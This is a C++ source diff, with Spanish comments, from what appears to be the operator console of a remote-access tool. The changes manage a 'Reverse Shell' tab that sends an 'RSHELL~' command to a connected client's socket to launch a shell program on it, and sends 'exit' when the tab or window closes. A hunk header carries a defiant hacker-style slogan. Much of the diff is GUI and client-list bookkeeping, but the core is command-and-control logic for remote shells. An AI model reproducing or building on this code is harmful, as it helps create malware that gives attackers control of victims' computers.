@@ -81,11 +81,30 @@ Me pueden detener a mí, pero no nos pueden detenernos a todos, al fin y al cabo 
 
     SetClientSize(800, 450);
     SetSizeHints(820, 485, 820, 485);
-    
-    //this->btn_Test = new wxButton(pnl_Right, EnumIDS::ID_FrameClienteTest, "EXEC");
 
 
+}
 
+void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
+    int closedPage = event.GetSelection();
+    wxString pageTitle = this->m_tree->p_Notebook->GetPageText(closedPage);
+    if (pageTitle == "Reverse Shell") {
+        //Enviar comando para cerrar shell al cerra la tab
+        std::unique_lock<std::mutex> lock(vector_mutex);
+
+        for (auto aClient = p_Servidor->vc_Clientes.begin(); aClient != p_Servidor->vc_Clientes.end(); aClient++) {
+            if (aClient->_id == this->strClienteID) {
+                if (aClient->_isRunningShell) {
+                    aClient->_isRunningShell = false;
+                    std::string strComando = "exit\r\n";
+                    p_Servidor->cSend(aClient->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
+                }
+                break;
+            }
+        }
+        lock.unlock();
+    }
+    event.Skip();
 }
 
 void FrameCliente::OnTest(wxCommandEvent& event) {
@@ -107,40 +126,24 @@ void FrameCliente::OnTest(wxCommandEvent& event) {
 void FrameCliente::OnClose(wxCloseEvent& event) {
     std::unique_lock<std::mutex> lock(vector_mutex);
     
-    if (p_Servidor) {
-        for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
-            if (iter->_id == this->strClienteID) {
-                iter->_isBusy = false;
-                iter->_ttUltimaVez = time(0);
-                break;
-            }
-            ++iter;
+    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
+        if (iter->_id == this->strClienteID) {
+            iter->_isBusy = false;
+            iter->_ttUltimaVez = time(0);
+            std::cout << "running shell?: " << iter->_isRunningShell << std::endl;
+            if (iter->_isRunningShell) {
+                iter->_isRunningShell = false;
+                std::string strComando = "exit\r\n";
+                p_Servidor->cSend(iter->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
+            } 
+            break;
         }
+        ++iter;
     }
+    
     lock.unlock();
 
     event.Skip();
-}
-
-void MyTreeCtrl::CrearNotebook() {
-    this->p_Notebook = new wxAuiNotebook(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, 
-        wxAUI_NB_CLOSE_ON_ACTIVE_TAB);
-
-    this->p_Notebook->Freeze();
-    wxPanel *m_BPanel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(100, 150));
-    m_BPanel->SetBackgroundColour(wxColor(0, 255, 0)); // REMOVE AT THE END
-
-    this->p_Notebook->AddPage(m_BPanel, "Testing", false);
-    /*this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some text",
-        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 1", false);
-
-    this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some more text",
-        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 2");
-
-    this->p_Notebook->AddPage(new wxTextCtrl(ctrl, wxID_ANY, "Some more text",
-        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 3");*/
-    this->p_Notebook->Thaw();
-   
 }
 
 void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
@@ -181,22 +184,6 @@ panelTest::panelTest(wxWindow* pParent) :
     this->lblOutputTest = new wxStaticText(this, EnumIDS::ID_Panel_Label_Test, wxT("Output"), wxPoint(20, 20));
 }
 
-panelReverseShell::~panelReverseShell() {
-    std::vector<struct Cliente> vc_Copy;
-    std::unique_lock<std::mutex> lock(vector_mutex);
-
-    vc_Copy = p_Servidor->vc_Clientes;
-    lock.unlock();
-
-    for (auto aClient : vc_Copy) {
-        if (aClient._id == this->strID) {
-            std::string strComando = "exit\r\n";
-            p_Servidor->cSend(aClient._sckCliente, strComando.c_str(), strComando.size(), 0, false);
-            break;
-        }
-    }
-}
-
 panelReverseShell::panelReverseShell(wxWindow* pParent) :
     wxPanel(pParent, EnumIDS::ID_Panel_Reverse_Shell) {
     wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
@@ -217,19 +204,18 @@ panelReverseShell::panelReverseShell(wxWindow* pParent) :
     Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);
 
     //Enviar comando al cliente para que ejecute
-    std::vector<struct Cliente> vc_Copy;
     std::unique_lock<std::mutex> lock(vector_mutex);
 
-    vc_Copy = p_Servidor->vc_Clientes;
-    lock.unlock();
-
-    for (auto aClient : vc_Copy) {
-        if (aClient._id == this->strID) {
-            std::string strComando = "RSHELL~cmd.exe";
-            int ib = p_Servidor->cSend(aClient._sckCliente, strComando.c_str(), strComando.size(), 0, false);
+    for (auto aClient = p_Servidor->vc_Clientes.begin(); aClient != p_Servidor->vc_Clientes.end(); aClient++) {
+        if (aClient->_id == this->strID) {
+            aClient->_isRunningShell = true;
+            std::string strComando = "RSHELL~notepad.exe";
+            int ib = p_Servidor->cSend(aClient->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
             break;
         }
     }
+    lock.unlock();
+
 }
 
 void panelReverseShell::OnText(wxCommandEvent& event) {
